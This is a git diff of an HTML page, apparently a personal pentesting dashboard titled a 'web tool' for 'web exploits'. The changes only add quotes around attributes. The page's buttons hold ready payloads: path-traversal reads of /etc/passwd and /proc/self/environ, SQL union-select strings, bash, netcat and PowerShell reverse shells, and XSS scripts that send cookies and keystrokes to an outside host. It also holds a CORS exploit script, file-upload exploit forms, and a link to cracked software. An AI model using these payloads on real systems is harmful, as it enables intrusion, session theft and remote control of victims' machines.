@@ -145,26 +145,26 @@ justify-content:center;
     </center>
     <br>
     <!--Start First phase of buttons-->
-    <button onclick=alert('...//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00')>
-      <font color=black>LFI-passwd</font>
+    <button onclick="alert('...//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00')">
+      <font color="black">LFI-passwd</font>
     </button>
-    <button onclick=alert('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==')>
-      <font color=black>LFI-shell</font>
+    <button onclick="alert('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==')">
+      <font color="black">LFI-shell</font>
     </button>
-    <button onclick=alert('../../../../../../../../proc/self/environ')>
-      <font color=black>LFI-environ</font>
+    <button onclick="alert('../../../../../../../../proc/self/environ')">
+      <font color="black">LFI-environ</font>
     </button>
-    <button onclick=alert('C:\\Windows\\System32\\drivers\\etc\\hosts')>
-      <font color=black>LFI-Win</font>
+    <button onclick="alert('C:\\Windows\\System32\\drivers\\etc\\hosts')">
+      <font color="black">LFI-Win</font>
     </button>
     <button onclick="alert('/proc/self/fd/1 to 100')">
-      <font color=black>LFI-Log</font>
+      <font color="black">LFI-Log</font>
     </button>
     <br>
     <br>
     
     <!-- second button phase-->
-    <button onclick=alert("%23%0AAND%23%0A0%23%0AUNION%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ASelect%23%0A1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22")>
+    <button onclick='alert("%23%0AAND%23%0A0%23%0AUNION%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ASelect%23%0A1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22")'>
       <font color=blue>Bof union select</font>
     </button>
     <button onclick=alert("1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200")>
@@ -202,31 +202,31 @@ justify-content:center;
       <font color=black>Win Reverse</font>
     </button>
     <button onclick=alert("powershell&nbsp;IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString('http://127.0.0.1:4444/shell.ps1')")>
-      <font color=black>Win Reverse</font>
+      <font color='black'>Win Reverse</font>
     </button>
-    <button onclick=alert('sh&nbsp;-i&nbsp;&gt;&amp;&nbsp;&#47;dev&#47;udp&#47;10.0.0.1&#47;4242&nbsp;0&gt;&1')>
-      <font color=black>Linux UDP reverse</font>
+    <button onclick="alert('sh&nbsp;-i&nbsp;&gt;&amp;&nbsp;&#47;dev&#47;udp&#47;10.0.0.1&#47;4242&nbsp;0&gt;&1')">
+      <font color='black'>Linux UDP reverse</font>
     </button>
-    <button onclick=alert('bash&nbsp;-i&nbsp;&gt;&&nbsp;/dev/tcp/10.0.0.1/4242&nbsp;0&gt;1')>
-      <font color=black>Linux TCP reverse</font>
+    <button onclick="alert('bash&nbsp;-i&nbsp;&gt;&&nbsp;/dev/tcp/10.0.0.1/4242&nbsp;0&gt;1')">
+      <font color='black'>Linux TCP reverse</font>
     </button>
-    <button onclick=alert('nc&nbsp;-e&nbsp;/bin/sh&nbsp;10.0.0.1&nbsp;4242')>
-      <font color=black>Linux NC reverse</font>
+    <button onclick="alert('nc&nbsp;-e&nbsp;/bin/sh&nbsp;10.0.0.1&nbsp;4242')">
+      <font color='black'>Linux NC reverse</font>
     </button>
-    <button onclick=alert("&lt;script&gt;fetch(&apos;https://target.com/steal?cookie=&apos;&nbsp;+&nbsp;btoa(document.cookie));&lt;/script&gt;")>
-      <font color=green>XSS cookie</font>
+    <button onclick='alert("&lt;script&gt;fetch(&apos;https://target.com/steal?cookie=&apos;&nbsp;+&nbsp;btoa(document.cookie));&lt;/script&gt;")'>
+      <font color='green'>XSS cookie</font>
     </button>
     <button onclick=alert('&lt;script&gt;window.location.href&nbsp;=&nbsp;"https://exampleURL.com/"&#59;&lt;/script&gt;')>
-      <font color=green>XSS redirect</font>
+      <font color='green'>XSS redirect</font>
     </button>
     <button onclick='alert("&lt;script&gt;document.querySelector(&apos;html&apos;).innerHTML=&apos;hacked-by-me&apos;&lt;/script&gt;")'>
-      <font color=green>XSS deface</font>
+      <font color='green'>XSS deface</font>
     </button>
-    <button onclick=alert("&lt;script&gt;document.onkeypress&nbsp;=&nbsp;function(e)&nbsp;{&nbsp;fetch(&apos;https://target.com/log?key=&apos;&nbsp;+&nbsp;btoa(e.key)&nbsp;);}&lt;/script&gt;")>
-      <font color=green>XSS Logger</font>
+    <button onclick='alert("&lt;script&gt;document.onkeypress&nbsp;=&nbsp;function(e)&nbsp;{&nbsp;fetch(&apos;https://target.com/log?key=&apos;&nbsp;+&nbsp;btoa(e.key)&nbsp;);}&lt;/script&gt;")'>
+      <font color='green'>XSS Logger</font>
     </button>
-    <button onclick=alert('&lt;meta&nbsp;http-equiv=&quot;Refresh&quot;&nbsp;content=&quot;0&#59;&nbsp;url=https://m00nissmiling.github.io/index111111.html&quot;&nbsp;&gt;')>
-      <font color=green>HTML Redirect</font>
+    <button onclick="alert('&lt;meta&nbsp;http-equiv=&quot;Refresh&quot;&nbsp;content=&quot;0&#59;&nbsp;url=https://m00nissmiling.github.io/index111111.html&quot;&nbsp;&gt;')">
+      <font color='green'>HTML Redirect</font>
     </button>
     <!--<img src= width=220px height=125px>-->
     <br>
@@ -239,191 +239,191 @@ justify-content:center;
     </center>
     <br>
     <!--Start Second phase of buttons-->
-    <a href=https://portswigger.net/web-security/sql-injection/cheat-sheet>
+    <a href='https://portswigger.net/web-security/sql-injection/cheat-sheet'>
       <button>
-        <font color=green>Portswigger db cheetsheet</font>
+        <font color='green'>Portswigger db cheetsheet</font>
       </button>
     </a>
-    <a href=https://www.exploit-db.com/google-hacking-database>
+    <a href='https://www.exploit-db.com/google-hacking-database'>
       <button>
-        <font color=green>Google hacking database</font>
+        <font color='green'>Google hacking database</font>
       </button>
     </a>
-    <a href=https://subdomainfinder.c99.nl />
+    <a href='https://subdomainfinder.c99.nl' />
     <button>
-      <font color=green>Subdomain-Finder</font>
+      <font color='green'>Subdomain-Finder</font>
     </button>
     </a>
-    <a href=https://hashes.com/en/decrypt/hash>
+    <a href='https://hashes.com/en/decrypt/hash'>
       <button>
-        <font color=green>Hash-Decrypter</font>
+        <font color='green'>Hash-Decrypter</font>
       </button>
     </a>
-    <a href=https://www.duckdns.org/domains>
+    <a href='https://www.duckdns.org/domains'>
       <button>
-        <font color=green>Duck DNS</font>
+        <font color='green'>Duck DNS</font>
       </button>
     </a>
-    <a href=https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet />
+    <a href='https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet' />
     <button>
-      <font color=green>Sqli Auth Bypass</font>
+      <font color='green'>Sqli Auth Bypass</font>
     </button>
     </a>
-    <a href=https://codebeautify.org/binary-to-text>
+    <a href='https://codebeautify.org/binary-to-text'>
       <button>
-        <font color=green>Binary Decoder</font>
+        <font color='green'>Binary Decoder</font>
       </button>
     </a>
-    <a href=https://temp-mail.org/en />
+    <a href='https://temp-mail.org/en' />
     <button>
-      <font color=green>Temp Mail</font>
+      <font color='green'>Temp Mail</font>
     </button>
     </a>
-    <a href=https://osintframework.com />
+    <a href='https://osintframework.com' />
     <button>
-      <font color=green>OSINT Framework</font>
+      <font color='green'>OSINT Framework</font>
     </button>
     </a>
-    <a href=https://tools.nakanosec.com/cj.html />
+    <a href='https://tools.nakanosec.com/cj.html'/>
     <button>
-      <font color=green>Clickjacking</font>
+      <font color='green'>Clickjacking</font>
     </button>
     </a>
     <!--End Second phase of buttons-->
     <br>
     <br>
     <!--Start Third phase of buttons-->
-    <a href=https://wiki.owasp.org/index.php/OWASP_favicon_database>
+    <a href='https://wiki.owasp.org/index.php/OWASP_favicon_database'>
       <button>
-        <font color=red>Favicon Framework chacker</font>
+        <font color='red'>Favicon Framework chacker</font>
       </button>
     </a>
-    <a href=https://crackstation.net />
+    <a href='https://crackstation.net' />
     <button>
-      <font color=red>Billion of hashes decrypter</font>
+      <font color='red'>Billion of hashes decrypter</font>
     </button>
     </a>
-    <a href=https://archive.org/web />
+    <a href='https://archive.org/web' />
     <button>
-      <font color=red>Website Wayback machine</font>
+      <font color='red'>Website Wayback machine</font>
     </button>
     </a>
-    <a href=https://pipedream.com/requestbin>
+    <a href='https://pipedream.com/requestbin'>
       <button>
-        <font color=red>HTTP request catcher(for ssrf)</font>
+        <font color='red'>HTTP request catcher(for ssrf)</font>
       </button>
     </a>
-    <a href=https://bxsshunter.com/dashboard>
+    <a href='https://bxsshunter.com/dashboard'>
       <button>
-        <font color=red>Blind Xss Payloads</font>
+        <font color='red'>Blind Xss Payloads</font>
       </button>
     </a>
-    <a href=https://tools.nakanosec.com/csrf />
+    <a href='https://tools.nakanosec.com/csrf' />
     <button>
-      <font color=red>CSRF Poc Generator</font>
+      <font color='red'>CSRF Poc Generator</font>
     </button>
     </a>
-    <a href=https://www.webfx.com/tools/http-status-tool />
+    <a href='https://www.webfx.com/tools/http-status-tool' />
     <button>
-      <font color=red>HTTP status checker</font>
+      <font color='red'>HTTP status checker</font>
     </button>
     </a>
-    <a href=https://mxtoolbox.com/CNAMELookup.aspx>
+    <a href='https://mxtoolbox.com/CNAMELookup.aspx'>
       <button>
-        <font color=red>web cname checker</font>
+        <font color='red'>web cname checker</font>
       </button>
     </a>
     <br>
     <br>
-    <a href=http://patorjk.com/software/taag/#p=display&f=Puffy&t=BMI>
+    <a href='http://patorjk.com/software/taag/#p=display&f=Puffy&t=BMI'>
       <button>
-        <font color=red>Logo creater web</font>
+        <font color='red'>Logo creater web</font>
       </button>
     </a>
-    <a href=https://getintopc.com/>
+    <a href='https://getintopc.com/'>
       <button>
-        <font color=red>Cracked Software Collections</font>
+        <font color='red'>Cracked Software Collections</font>
       </button>
     </a>
-    <a href=https://viewdns.info/>
+    <a href='https://viewdns.info/'>
       <button>
-        <font color=red>View DNS-info</font>
+        <font color='red'>View DNS-info</font>
       </button>
     </a>
     <!--End Third phase of buttons-->
     <br>
     <br>
     <!--Start Fourth phase of buttons-->
-    <a href=https://beautifier.io />
+    <a href='https://beautifier.io' />
     <button>
-      <font color=red>JS Beautifier</font>
+      <font color='red'>JS Beautifier</font>
     </button>
     </a>
-    <a href=https://codebeautify.org/>
+    <a href='https://codebeautify.org'/>
       <button>
-        <font color=red>HTML Beautifier</font>
+        <font color='red'>HTML Beautifier</font>
       </button>
     </a>
-    <a href=https://threatmap.checkpoint.com />
+    <a href='https://threatmap.checkpoint.com' />
     <button>
-      <font color=red>Cyber War Map</font>
+      <font color='red'>Cyber War Map</font>
     </button>
     </a>
-    <a href=https://wpscan.com/profile>
+    <a href='https://wpscan.com/profile'>
       <button>
-        <font color=red>Wpscan api</font>
+        <font color='red'>Wpscan api</font>
       </button>
     </a>
-    <a href=https://flowcv.com>
+    <a href='https://flowcv.com'>
       <button>
-        <font color=red>For Your CV</font>
+        <font color='red'>For Your CV</font>
       </button>
     </a>
     <br>
     <br>
-    <a href=https://www.youtube.com/watch?v=LarshUB-6iM&list=PLwVlbpMw9hDnAFFKlCtxFXGxbNg3b7f1G&index=30>
+    <a href='https://www.youtube.com/watch?v=LarshUB-6iM&list=PLwVlbpMw9hDnAFFKlCtxFXGxbNg3b7f1G&index=30'>
       <button>
-        <font color=purple>PHP Myanmar Course</font>
+        <font color='purple'>PHP Myanmar Course</font>
       </button>
     </a>
-    <a href=https://github.com/swisskyrepo/PayloadsAllTheThings>
+    <a href='https://github.com/swisskyrepo/PayloadsAllTheThings'>
       <button>
-        <font color=purple>Payloas All The Things</font>
+        <font color='purple'>Payloas All The Things</font>
       </button>
     </a>
-    <a href=https://github.com/danielmiessler/SecLists>
+    <a href='https://github.com/danielmiessler/SecLists'>
       <button>
-        <font color=purple>Seclists</font>
+        <font color='purple'>Seclists</font>
       </button>
     </a>
-    <a href=https://gtfobins.github.io/>
+    <a href="https://gtfobins.github.io/">
       <button>
-        <font color=purple>Priv Esc Commands[GTFobin]</font>
+        <font color="purple">Priv Esc Commands[GTFobin]</font>
       </button>
     </a>
-    <a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
+    <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">
       <button>
-        <font color=purple>XSS Bypass Cheatsheet</font>
+        <font color="purple">XSS Bypass Cheatsheet</font>
       </button>
     </a>
-    <a href=https://github.com/m00nisSmiling/My_df/blob/main/moonissmiling.html>
+    <a href="https://github.com/m00nisSmiling/My_df/blob/main/moonissmiling.html">
       <button>
-        <font color=purple>Moonissmiling codes</font>
+        <font color="purple">Moonissmiling codes</font>
       </button>
     </a>
-    <a href=https://highon.coffee/blog/lfi-cheat-sheet />
+    <a href="https://highon.coffee/blog/lfi-cheat-sheet" />
     <button>
-      <font color=purple>LFI cheatsheet</font>
+      <font color="purple">LFI cheatsheet</font>
     </button>
     </a>
-    <a href=https://github.com/payloadbox/rfi-lfi-payload-list>
+    <a href="https://github.com/payloadbox/rfi-lfi-payload-list">
       <button>
-        <font color=purple>RFI cheatsheet</font>
+        <font color="purple">RFI cheatsheet</font>
       </button>
     </a>
-    <a href=https://highon.coffee/blog/ssrf-cheat-sheet/>
+    <a href="https://highon.coffee/blog/ssrf-cheat-sheet"/>
       <button>
-        <font color=purple>SSRF cheatsheet</font>
+        <font color="purple">SSRF cheatsheet</font>
       </button>
     </a>
     <br><br>
@@ -458,89 +458,89 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
       <h1>Labs And CTF</h1>
       <br>
     </center>
-    <a href=https://academy.hackthebox.com/dashboard>
+    <a href="https://academy.hackthebox.com/dashboard">
       <button class="hello">
-        <font color=red>Hack The Box</font>
+        <font color="red">Hack The Box</font>
       </button>
     </a>
-    <a href=https://tryhackme.com/dashboard>
+    <a href="https://tryhackme.com/dashboard">
       <button class="hello">
-        <font color=red>Try Hack Me</font>
+        <font color="red">Try Hack Me</font>
       </button>
     </a>
-    <a href=https://portswigger.net/web-security/dashboard>
+    <a href="https://portswigger.net/web-security/dashboard">
       <button class="hello">
-        <font color=red>Portswigger</font>
-      </button>
-    </a>
-    <br>
-    <br>
-    <a href=https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip>
-      <button class="hello">
-        <font color=red>Lazysysadmin Lab CTF[Network Pentesting]</font>
+        <font color="red">Portswigger</font>
       </button>
     </a>
     <br>
     <br>
-    <a href=https://download.vulnhub.com/pentesterlab/web_for_pentester.iso>
+    <a href="https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip">
       <button class="hello">
-        <font color=red>Web For Pentester Lab[Note: Web Pentesting]</font>
+        <font color="red">Lazysysadmin Lab CTF[Network Pentesting]</font>
       </button>
     </a>
     <br>
     <br>
-    <a href=http://lab.awh.zdresearch.com />
+    <a href="https://download.vulnhub.com/pentesterlab/web_for_pentester.iso">
+      <button class="hello">
+        <font color="red">Web For Pentester Lab[Note: Web Pentesting]</font>
+      </button>
+    </a>
+    <br>
+    <br>
+    <a href="http://lab.awh.zdresearch.com" />
     <button class="hello">
-      <font color=red>Zdresearch Online Lab[Dvwa,Web goat,Bwapp]</font>
+      <font color="red">Zdresearch Online Lab[Dvwa,Web goat,Bwapp]</font>
     </button>
     </a>
     <br>
     <br>
-    <a href=https://juice-shop.herokuapp.com>
+    <a href="https://juice-shop.herokuapp.com">
       <button class="hello">
-        <font color=red>OWASP Juice shop[ Web Pentesting CTF ]</font>
+        <font color="red">OWASP Juice shop[ Web Pentesting CTF ]</font>
       </button>
     </a>
     <br>
     <br>
-    <a href=https://www.root-me.org/?lang=en>
+    <a href="https://www.root-me.org/?lang=en">
       <button class="hello">
-        <font color=red>ROOT-ME [ ONLINE WEB CTF And Challenges ]</font>
+        <font color="red">ROOT-ME [ ONLINE WEB CTF And Challenges ]</font>
       </button>
     </a>
     <br>
     <br>
-    <a href=https://ctf.hacker101.com />
+    <a href="https://ctf.hacker101.com" />
     <button class="hello">
-      <font color=red>HACKER-101 [ Online web ctf and challenges ]</font>
+      <font color="red">HACKER-101 [ Online web ctf and challenges ]</font>
     </button>
     </a>
     <br>
     <br>
-    <a href=https://www.youtube.com/channel/UCd2E0oxDiionz_67h9pD6zg>
+    <a href="https://www.youtube.com/channel/UCd2E0oxDiionz_67h9pD6zg">
       <button class="hello">
-        <font color=red>Call Me Moon Youtube Channel</font>
+        <font color="red">Call Me Moon Youtube Channel</font>
       </button>
       <br>
       <br>
-      <a href=https://bugcrowd.com/dashboard>
+      <a href="https://bugcrowd.com/dashboard">
         <button class="hello">
-          <font color=red>Bugcrowd</font>
+          <font color="red">Bugcrowd</font>
         </button>
       </a>
-      <a href=https://bughunters.google.com/leaderboard>
+      <a href="https://bughunters.google.com/leaderboard">
         <button class="hello">
-          <font color=red>Google Bughunter</font>
+          <font color="red">Google Bughunter</font>
         </button>
       </a>
-      <a href=https://hackerone.com/opportunities/all>
+      <a href="https://hackerone.com/opportunities/all">
         <button class="hello">
-          <font color=red>Hackerone</font>
+          <font color="red">Hackerone</font>
         </button>
       </a>
       <a href=https://www.openbugbounty.org />
       <button class="hello">
-        <font color=red>Open bugbounty</font>
+        <font color="red">Open bugbounty</font>
       </button>
     </a>
     <br><br>
@@ -554,7 +554,7 @@ cookie steal xss >><script>fetch('https://target.com/steal?cookie=' + btoa(docum
  bxss            >></textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
  redirect to xss >>        javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain 
 -->
-    <!-- -->   <center><hr color=blue><h1><font color=#A0FFA0>[CORS POC EXPLOIT]</font></h1><h3><font color=lime>[BY m00nIsSmiling]</font></h3><div id="demo"><button type="button" onclick="cors()">Exploit</button></div><script>
+    <!-- -->   <center><hr color="blue"><h1><font color="#A0FFA0">[CORS POC EXPLOIT]</font></h1><h3><font color="lime">[BY m00nIsSmiling]</font></h3><div id="demo"><button type="button" onclick="cors()">Exploit</button></div><script>
         function cors() {
           var xhttp = new XMLHttpRequest();
           xhttp.onreadystatechange = function() {
@@ -568,7 +568,7 @@ cookie steal xss >><script>fetch('https://target.com/steal?cookie=' + btoa(docum
         }
       </script><!--<hr color=blue></body><hr color=red><h1>Jquery file upload exploit</h1><form method="POST" action="" enctype="multipart/form-data"><input type="file" name="file[]" /><br><br><button>upload</button></form><hr color=red><hr color=green><h1>wp-admin-file-upload</h1><form action="" method="POST" enctype="multipart/form-data"><input type="hidden" name="task" value="vrt_add_new_album" /><input type="hidden" name="album_name" value="Arbitrary File Upload" /><input type="hidden" name="album_desc" value="Arbitrary File Upload" /><input type="file" name="album_img" value="" /><br><br><input type="submit" value="Submit" /></form>-->
   
-    <pre><font color=black>
+    <pre><font color="black">
 + this web tool is created by "moon" +
 + use for "web exploits" +
 + and train your skill in "ctf playground" +
